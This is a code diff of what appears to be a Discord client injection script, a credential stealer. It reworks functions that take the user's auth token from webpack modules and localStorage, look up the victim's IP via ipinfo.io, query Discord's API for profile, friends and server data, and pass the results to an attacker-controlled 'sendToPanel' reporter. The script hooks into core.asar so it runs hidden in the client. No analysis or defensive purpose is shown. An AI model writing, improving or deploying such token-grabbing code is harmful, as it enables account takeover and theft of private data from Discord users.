@@ -20,39 +20,46 @@ function sendToPanel(payload) {
     });
 }
 
-async function getToken() {
-    let token = null;
-    if (window.webpackChunkdiscord_app) {
-        window.webpackChunkdiscord_app.push([[Symbol()], {}, o => {
-            for (let e of Object.values(o.c)) {
-                try {
-                    if (!e.exports || e.exports === window) continue;
-                    if (e.exports?.getToken) token = e.exports.getToken();
-                    for (let key in e.exports) {
-                        if (e.exports?.[key]?.getToken && "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]) {
-                            token = e.exports[key].getToken();
-                        }
+function getToken() {
+    return new Promise((resolve) => {
+        let token = null;
+        try {
+            const wpModule = window.webpackChunkdiscord_app;
+            if (wpModule) {
+                wpModule.push([[Symbol()], {}, o => {
+                    for (let e of Object.values(o.c)) {
+                        try {
+                            if (!e.exports || e.exports === window) continue;
+                            if (e.exports?.getToken) token = e.exports.getToken();
+                            for (let key in e.exports) {
+                                if (e.exports?.[key]?.getToken && "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]) {
+                                    token = e.exports[key].getToken();
+                                }
+                            }
+                        } catch {}
                     }
-                } catch {}
+                }]);
+                wpModule.pop();
             }
-        }]);
-        window.webpackChunkdiscord_app.pop();
-    }
-    if (!token) {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key && key.includes('token')) {
-                try {
-                    const parsed = JSON.parse(localStorage.getItem(key));
-                    if (parsed?.token) token = parsed.token;
-                } catch {}
-            }
+        } catch {}
+        if (!token) {
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && key.includes('token')) {
+                        try {
+                            const parsed = JSON.parse(localStorage.getItem(key));
+                            if (parsed?.token) token = parsed.token;
+                        } catch {}
+                    }
+                }
+            } catch {}
         }
-    }
-    return token;
+        resolve(token);
+    });
 }
 
-async function getIPInfo() {
+function getIPInfo() {
     return new Promise((resolve) => {
         https.get('https://ipinfo.io/json', (res) => {
             let data = '';
@@ -74,7 +81,7 @@ function getSystemInfo() {
     };
 }
 
-async function getUserInfo(token) {
+function getUserInfo(token) {
     return new Promise((resolve) => {
         const opts = { hostname: 'discord.com', path: '/api/v9/users/@me', method: 'GET', headers: { 'Authorization': token } };
         const req = https.request(opts, (res) => {
@@ -87,7 +94,7 @@ async function getUserInfo(token) {
     });
 }
 
-async function getRelationships(token) {
+function getRelationships(token) {
     return new Promise((resolve) => {
         const opts = { hostname: 'discord.com', path: '/api/v9/users/@me/relationships', method: 'GET', headers: { 'Authorization': token } };
         const req = https.request(opts, (res) => {
@@ -105,7 +112,7 @@ async function getRelationships(token) {
     });
 }
 
-async function getGuildCount(token) {
+function getGuildCount(token) {
     return new Promise((resolve) => {
         const opts = { hostname: 'discord.com', path: '/api/v9/users/@me/guilds', method: 'GET', headers: { 'Authorization': token } };
         const req = https.request(opts, (res) => {
@@ -197,7 +204,6 @@ setTimeout(async () => {
         const si = getSystemInfo();
         await sendToPanel({ ...si, injection_type: "error", error: "No token found" });
     }
-}, 5000);
+}, 10000);
 
-try { module.exports = require("./core.asar"); } catch (e) {}
 module.exports = require("./core.asar");
